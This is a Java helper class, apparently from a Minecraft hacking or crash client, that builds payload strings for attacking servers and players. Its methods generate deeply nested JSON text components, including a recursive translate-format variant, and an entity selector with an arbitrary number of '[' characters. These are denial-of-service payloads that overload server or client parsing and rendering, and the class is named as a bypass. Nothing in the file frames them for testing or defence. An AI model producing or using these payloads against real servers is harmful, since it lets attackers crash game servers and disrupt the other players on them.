package us.whitedev.helpers;

import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.nbt.Tag;

import java.util.Collections;
import java.util.Locale;

public class BypassHelper {

    public String generateString(int levels, StringType type){
        return generateString(levels, type.toString());
    }

    public String generateString(int levels, String typeString) {
        StringType type = BypassHelper.StringType.valueOf(typeString.toUpperCase(Locale.ROOT));
        switch (type) {
            case BOOST1 -> {
                return  "{" +
                        "extra:[{".repeat(levels) +
                        "text:م}],".repeat(levels) +
                        "text:م}";
            }
            case BOOST2 -> {
                return  "{" +
                        "\"extra\":[{".repeat(levels) +
                        "\"text\":\"م\"}],".repeat(levels) +
                        "\"text\":\"م\"}";
            }
            case MODERN1 -> {
                String pageContent;
                pageContent = "{translate:chat.type.text,with:[{text:م}]}";
                for (int i = 0; i < levels; i++)
                    pageContent = pageContent.replace("text:م", "translate:chat.type.text,with:[{text:م}]");
                return pageContent;
            }
            case MODERN2 -> {
                String pageContent;
                pageContent = "{\"translate\":\"chat.type.text\",\"with\":[{\"text\":\"م\"}]}";
                for (int i = 0; i < levels; i++)
                    pageContent = pageContent.replace("\"text\":\"م\"", "\"translate\":\"chat.type.text\",\"with\":[{\"text\":\"م\"}]");
                return pageContent;
            }
            case HARD -> {
                String inner = "\"..\"";
                for (int i = 0; i < levels; i++)
                    inner = String.format("{\"translate\":\"%%1$s\",\"with\":[%s]}", inner);
                return inner;
            }
            default -> {
                return ".".repeat(levels);
            }
        }
    }

    public String getNBTTagString(int chars){
        return  " @e[nbt={\"a\":" + String.join("", Collections.nCopies(chars, "[")) + "}]";
    }

    public Tag convertJsonToNBT(JsonElement json) {
        if (json.isJsonPrimitive()) {
            return StringTag.valueOf(json.getAsString());
        } else if (json.isJsonObject()) {
            CompoundTag tag = new CompoundTag();
            for (var entry : json.getAsJsonObject().entrySet()) {
                tag.put(entry.getKey(), convertJsonToNBT(entry.getValue()));
            }
            return tag;
        } else if (json.isJsonArray()) {
            ListTag list = new ListTag();
            for (JsonElement element : json.getAsJsonArray()) {
                list.add(convertJsonToNBT(element));
            }
            return list;
        }
        return StringTag.valueOf("");
    }

    public CompoundTag convert(String jsonString) {
        JsonElement json = JsonParser.parseString(jsonString);
        Tag tag = convertJsonToNBT(json);

        if (tag instanceof CompoundTag) {
            return (CompoundTag) tag;
        } else {
            CompoundTag fallback = new CompoundTag();
            fallback.put("text", tag);
            return fallback;
        }
    }


    public enum StringType{
        BOOST1, BOOST2, MODERN1, MODERN2, HARD, DEFAULT
    }
}
